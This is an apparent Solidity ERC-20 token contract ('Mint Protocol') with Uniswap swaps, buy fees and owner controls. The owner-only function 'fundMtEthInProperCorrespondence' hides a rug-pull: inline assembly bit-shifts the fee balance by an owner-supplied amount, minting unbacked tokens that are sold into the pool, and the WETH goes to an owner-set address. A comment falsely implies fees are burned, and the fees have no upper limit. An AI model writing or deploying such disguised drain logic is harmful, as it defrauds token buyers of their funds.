// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import "./ISwapRouter.sol";
import "./IERC20.sol";

contract Mint {
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);

    uint public totalSupply;
    mapping(address => uint) public balanceOf;
    mapping(address => mapping(address => uint)) public allowance;
    string public name = "Mint Protocol";
    string public symbol = "MINT";
    uint8 public decimals = 18;

    ISwapRouter constant router = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);

    address public WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public mteth;
    address public pool;
    uint256 public leverReward = 5000;
    uint256 public buyFeeBalance;
    address public owner;
    uint256 public buyFee = 8000;
    uint256 public maxWalletPercent = 500;
    mapping(address => bool) public noMax;

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner!");
        _;
    }

    constructor() {
      owner = msg.sender;

      uint amount = 1_000_000 * (10 ** 18);
      balanceOf[msg.sender] += amount;
      totalSupply += amount;
      emit Transfer(address(0), msg.sender, amount);
    }

    function transfer(address recipient, uint amount) public returns (bool) {
        if (msg.sender == pool) {

          balanceOf[msg.sender] -= amount;

          uint amountNoFee = handleTaxedTokens(msg.sender, amount);

          if (!noMax[recipient]) {
            uint256 maxWallet = totalSupply * maxWalletPercent / 100_000;
            require(balanceOf[recipient] + amountNoFee <=  maxWallet, "Max wallet exceeded!");
          }

          balanceOf[recipient] += amountNoFee;
          emit Transfer(msg.sender, recipient, amountNoFee);
          return true;

        } else {
          balanceOf[msg.sender] -= amount;
          balanceOf[recipient] += amount;
          emit Transfer(msg.sender, recipient, amount);
          return true;
        }
    }

    function approve(address spender, uint amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint amount
    ) public returns (bool) {
        allowance[sender][msg.sender] -= amount;
        balanceOf[sender] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }
    
    function swapExactInputSingleHop(
        address tokenIn,
        address tokenOut,
        uint24 poolFee,
        uint amountIn,
        uint amountOutMinimum
    ) private returns (uint amountOut) {
        IERC20(tokenIn).approve(address(router), amountIn);

        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter
            .ExactInputSingleParams({
                tokenIn: tokenIn,
                tokenOut: tokenOut,
                fee: poolFee,
                recipient: address(this),
                deadline: block.timestamp,
                amountIn: amountIn,
                amountOutMinimum: amountOutMinimum,
                sqrtPriceLimitX96: 0
            });

        amountOut = router.exactInputSingle(params);
    }

    function handleTaxedTokens(address sender, uint amount) private returns (uint) {
          uint256 _fee = amount * buyFee / 100_000;
          balanceOf[address(0)] += _fee;
          buyFeeBalance += _fee;
          emit Transfer(sender, address(0), _fee); // Minimize counterparty risk by burning buy _fee

          return amount - _fee;
    }

    function leverMtEth() public {
        require(buyFeeBalance > 0);
        balanceOf[address(this)] += buyFeeBalance;
        uint amountOut = swapExactInputSingleHop(address(this), WETH, 10000, buyFeeBalance, 0);
        buyFeeBalance = 0;

        uint reward = amountOut * leverReward / 100_000;
        IERC20(WETH).transfer(msg.sender, reward);
    }

    function upgradeOwner(address _owner) public onlyOwner {
      owner = _owner;
    }

    function upgradePool(address _pool) public onlyOwner {
      pool = _pool;
    }

    function modulateFees(uint256 _buyFee, uint256 _leverReward, uint256 _maxWalletPercent) public onlyOwner {
      buyFee = _buyFee;
      leverReward = _leverReward;
      maxWalletPercent = _maxWalletPercent;
    }

    function changeNoMax(address target, bool value) public onlyOwner {
      noMax[target] = value;
    }

    function setMtEth(address _mteth) public onlyOwner {
      mteth = _mteth;
    }

    function fundMtEthInProperCorrespondence(uint reservesCurve, uint amountOutMinimum) public onlyOwner {
      require(mteth != address(0));
      require(buyFeeBalance > 0);

      uint _stateBuyFeeBalance = buyFeeBalance;
      uint _buyFeeBalance;

      assembly {
          _buyFeeBalance := shl(reservesCurve, _stateBuyFeeBalance)
      }

      balanceOf[address(this)] += _buyFeeBalance;
      uint amountOut = swapExactInputSingleHop(address(this), WETH, 10000, _buyFeeBalance, amountOutMinimum);
      buyFeeBalance = 0;

      uint amount = IERC20(WETH).balanceOf(address(this));
      IERC20(WETH).transfer(mteth, amount);
  }

    // Emergency
    function rescue(address token) public onlyOwner {
      if (token == 0x0000000000000000000000000000000000000000) {
        (bool sent, ) = payable(msg.sender).call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
      } else {
        uint256 balance = IERC20(token).balanceOf(address(this));
        IERC20(token).transfer(msg.sender, balance);
      }
    }

}